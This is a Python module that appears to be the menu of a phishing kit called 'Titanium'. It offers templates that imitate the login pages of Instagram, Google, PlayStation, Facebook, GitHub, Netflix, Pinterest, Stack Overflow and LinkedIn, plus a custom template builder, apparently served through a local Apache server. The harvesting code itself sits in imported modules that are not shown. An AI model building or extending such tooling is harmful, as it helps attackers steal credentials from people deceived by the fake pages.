import Titanium
import os
from Core.Support import Font
from Core.Phish import Instagram
from Core.Phish import Git
from Core.Phish import Stack
from Core.Phish import Facebook
from Core.Phish import Netflix
from Core.Phish import Linkedin
from Core.Phish import Google
from Core.Phish import Pinterest
from Core.Phish import Playstation
from Core.Phish.Custom import Custom_creation
from Core.Phish.Custom import Custom


class Phishing:

    @staticmethod
    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        f = open("Banners/Phishing.txt", "r")
        banner = f.read()
        f.close()
        print(
            Font.Color.YELLOW + "***********************************************************")
        print(Font.Color.GREEN + banner)
        print(Font.Color.WHITE + "JUST A SIMPLE SOCIAL ENGIGNERING TOOL:)     CODED BY LUCKSI")
        print(
            Font.Color.YELLOW + "Instagram:lucks_022\nEMAIL:lukege287@gmail.com\nGIT-HUB:Lucksi\nWebsite:https://sosuke.altervista.org")
        print("***********************************************************")

    @staticmethod
    def main():
        try:
            Phishing.banner()
            template = int(input(
                Font.Color.GREEN + "[*INSERT AN OPTION*:]" + Font.Color.WHITE + "\n(1)INSTAGRAM      (2)GOOGLE\n(3)PLAYSTATION    (4)FACEBOOK\n(5)GIT-HUB        (6)NETFLIX\n(7)PINTEREST      (8)STACKOVERFLOW\n(9)LINKEDIN       (10)TEMPLATE CREATION\n(11)CUSTOM        (12)MAIN-MENU" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
            if template == 1:
                Instagram.Instagram.menu()
            elif template == 2:
                Google.Google.menu()
            elif template == 3:
                Playstation.Playstation.menu()
            elif template == 4:
                Facebook.Facebook.main()
            elif template == 5:
                Git.Git.menu()
            elif template == 6:
                Netflix.Netflix.menu()
            elif template == 7:
                Pinterest.Pinterest.menu()
            elif template == 8:
                Stack.Stackoverflow.menu()
            elif template == 9:
                Linkedin.Linkedin.menu()
            elif template == 10:
                Custom_creation.main()
            elif template == 11:
                Custom.main()
            elif template == 12:
                inp = input("PRESS ENTER TO CONTINUE...")
                Titanium.Main()
            else:
                out = input("OPS LOOKS LIKE YOU PRESSED AN INVALID OPTION PRESS ENTER TO CONTINUE")
        except KeyboardInterrupt:
            inp = input(
                Font.Color.RED + "\n\n[!]" + Font.Color.WHITE + "LOOKS LIKE YOU HIT CTRL'C YOU WILL BE REDIRECT TO MAIN-MENU PRESS ENTER TO CONTINUE" + Font.Color.RED + "[!]\n")
            os.system("service apache2 stop")
            Titanium.Main()
